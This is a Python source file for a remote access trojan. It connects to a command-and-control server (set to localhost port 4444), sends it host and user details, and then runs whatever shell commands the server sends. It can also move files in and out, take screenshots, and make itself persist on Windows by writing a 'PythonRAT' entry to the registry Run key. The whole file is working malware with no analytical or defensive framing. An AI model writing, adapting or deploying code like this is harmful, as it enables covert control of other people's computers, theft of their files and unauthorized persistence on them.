import socket
import subprocess
import os
import json
import threading
import time
import sys
import platform
import getpass

# config
C2_HOST = "127.0.0.1"
C2_PORT = 4444
BUFFER_SIZE = 4096

class RAT:
    def __init__(self, host=C2_HOST, port=C2_PORT):
        self.host = host
        self.port = port
        self.sock = None
        self.running = True
        self.system_info = self.gather_system_info()
    
    def gather_system_info(self):
        """collect host info for initial check-in"""
        return {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "user": getpass.getuser(),
            "arch": platform.machine(),
            "python_version": sys.version
        }
    
    def connect(self):
        """establish persistent connection to c2"""
        retry_delay = 5
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                # send initial beacon with system info
                self.sock.send(json.dumps({"type": "beacon", "data": self.system_info}).encode())
                return True
            except:
                time.sleep(retry_delay)
                retry_delay = min(retry_delay * 2, 60)
        return False
    
    def execute_command(self, cmd):
        """run shell command and return output"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {
                "status": "success",
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "error": "command timed out"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def file_transfer(self, action, path, data=None):
        """handle file upload/download"""
        if action == "download":
            try:
                if os.path.exists(path) and os.path.isfile(path):
                    with open(path, 'rb') as f:
                        content = f.read()
                    return {"status": "success", "data": content.hex(), "size": len(content)}
                else:
                    return {"status": "error", "error": "file not found"}
            except Exception as e:
                return {"status": "error", "error": str(e)}
        elif action == "upload":
            try:
                with open(path, 'wb') as f:
                    f.write(bytes.fromhex(data))
                return {"status": "success", "path": path}
            except Exception as e:
                return {"status": "error", "error": str(e)}
    
    def handle_task(self, task):
        """process incoming tasks from c2"""
        task_type = task.get("type")
        task_id = task.get("id")
        
        if task_type == "cmd":
            result = self.execute_command(task.get("cmd", ""))
            return {"type": "result", "id": task_id, "data": result}
        
        elif task_type == "download":
            result = self.file_transfer("download", task.get("path"))
            return {"type": "result", "id": task_id, "data": result}
        
        elif task_type == "upload":
            result = self.file_transfer("upload", task.get("path"), task.get("data"))
            return {"type": "result", "id": task_id, "data": result}
        
        elif task_type == "screenshot":
            # windows only screenshot capture
            if platform.system() == "Windows":
                try:
                    import mss
                    import mss.tools
                    with mss.mss() as sct:
                        screenshot = sct.shot(output="temp_screenshot.png")
                        with open(screenshot, 'rb') as f:
                            data = f.read().hex()
                        os.remove(screenshot)
                        return {"type": "result", "id": task_id, "data": {"status": "success", "screenshot": data}}
                except:
                    return {"type": "result", "id": task_id, "data": {"status": "error", "error": "screenshot failed"}}
            else:
                return {"type": "result", "id": task_id, "data": {"status": "error", "error": "unsupported os"}}
        
        elif task_type == "persist":
            # windows persistence via registry
            if platform.system() == "Windows":
                try:
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.SetValueEx(regkey, "PythonRAT", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                    return {"type": "result", "id": task_id, "data": {"status": "success", "message": "persistence installed"}}
                except:
                    return {"type": "result", "id": task_id, "data": {"status": "error", "error": "persistence failed"}}
            else:
                return {"type": "result", "id": task_id, "data": {"status": "error", "error": "unsupported os"}}
        
        elif task_type == "shutdown":
            self.running = False
            return {"type": "result", "id": task_id, "data": {"status": "shutting down"}}
        
        else:
            return {"type": "result", "id": task_id, "data": {"status": "error", "error": f"unknown task: {task_type}"}}
    
    def run(self):
        """main loop - receive and process tasks"""
        while self.running:
            try:
                # receive task from c2
                data = self.sock.recv(BUFFER_SIZE)
                if not data:
                    # connection lost, reconnect
                    self.sock.close()
                    self.connect()
                    continue
                
                task = json.loads(data.decode())
                result = self.handle_task(task)
                self.sock.send(json.dumps(result).encode())
                
            except json.JSONDecodeError:
                continue
            except socket.error:
                self.sock.close()
                self.connect()
            except Exception:
                continue
    
    def start(self):
        """start the rat"""
        if self.connect():
            self.run()

if __name__ == "__main__":
    rat = RAT()
    rat.start()